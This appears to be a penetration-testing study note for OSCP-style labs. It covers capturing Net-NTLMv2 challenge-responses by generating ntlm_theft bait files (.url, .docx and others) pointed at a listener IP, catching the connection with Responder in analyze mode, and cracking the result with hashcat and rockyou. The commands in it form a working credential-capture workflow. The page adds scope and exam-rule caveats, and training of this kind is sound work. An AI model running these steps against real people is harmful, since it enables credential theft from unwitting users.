# Net-NTLM capture with `ntlm_theft`

[← NT hashes and NetNTLMv2](ntlm.md) · [Client-side delivery](../web/client-side-phishing.md) · [Password quick reference](../07-password-attacks.md)

This is a client-authentication path, not local hash dumping. An NT hash from SAM/LSASS and a captured Net-NTLMv2 challenge-response are different materials: the latter is for offline cracking (`hashcat -m 5600`), **not** Pass the Hash.

| Trigger | What must happen | Stop condition |
| --- | --- | --- |
| `.url` in a folder | Explorer processes the shortcut/icon reference. | The target never browses the folder or cannot reach your SMB listener. |
| `.docx` or `.xlsx` | The target opens it and its external reference is fetched. | Office/file filtering or outbound SMB blocks the request. |
| `.Library-ms` or `.lnk` | The target opens or browses the generated file. | The client ignores the reference; change file type or return to another foothold. |

## Generate one fitting file type

Set `-s` to the IP the target can reach; `-f` is an **output basename**, not a UNC path. Start with one format that matches the real delivery workflow; `-g all` creates many files and is rarely needed. Generated files are placed in a directory named after the basename.

```bash
python3 ntlm_theft.py -g url  -s <LISTENER_IP> -f folder-probe
python3 ntlm_theft.py -g docx -s <LISTENER_IP> -f document-probe
# Only when surveying file types in a controlled lab; do not deliver all files indiscriminately:
python3 ntlm_theft.py -g all -s <LISTENER_IP> -f format-survey
```

The tool's README labels `.url` as a browse-to-folder trigger and `.docx` as an open-document trigger. Its `-f` argument is **not** `\\<LISTENER_IP>\share`; that was an error in the source note. The tool requires Python 3 and `xlsxwriter`. Do not assume every format works on current Windows/Office builds; test the exact generated file with an in-scope lab client before delivering it.

## Listen and verify

For an explicit reference to your listener IP, Responder can run in analyze mode so it does not answer LLMNR/NBT-NS queries; its configured SMB service still listens for direct connections. Confirm SMB is enabled, bound, and reachable on TCP 445. `-A` alone cannot make a blocked or untriggered connection appear.

```bash
sudo responder -I <vpn-interface> -A
sudo ss -ltn '( sport = :445 )'
```

Deliver only the chosen file through an in-scope upload, share, or [mail path](../web/client-side-phishing.md#authenticated-smtp-delivery). Observe a connection and a captured `user::domain:...` response in Responder's output/logs. If there is no connection, distinguish “not opened/processed” from “network blocked” before trying another file type. If outbound SMB is blocked, stop cycling through SMB-based files. A machine-account response may not be useful for the intended foothold.

```bash
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat --show -m 5600 netntlmv2.txt
```

Use only a captured response you are authorized to test. If cracking fails, keep the capture as evidence and move on; it cannot be used as an NT hash. NTLM relay is a separate path requiring a live authentication and a suitable target/service. The original vault note had only an untested manual-relay TODO, so there is no relay recipe here; do not infer that a captured string alone can be relayed.

Exam note: OffSec's current FAQ lists Responder and Impacket but forbids poisoning/spoofing; its guide also restricts automatic exploitation and restricted features inside otherwise allowed tools. `-A` is Responder's documented no-response analysis mode for name-resolution queries. Check the current [exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) and [FAQ](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ) before using any relay or name-resolution feature. Do not label a specific `ntlmrelayx` invocation categorically permitted or banned from the tool name alone.

References: [`ntlm_theft` usage and file types](https://github.com/Greenwolf/ntlm_theft) · [Responder analyze mode](https://github.com/SpiderLabs/Responder/blob/master/README.md) · [OffSec OSCP+ FAQ](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ).
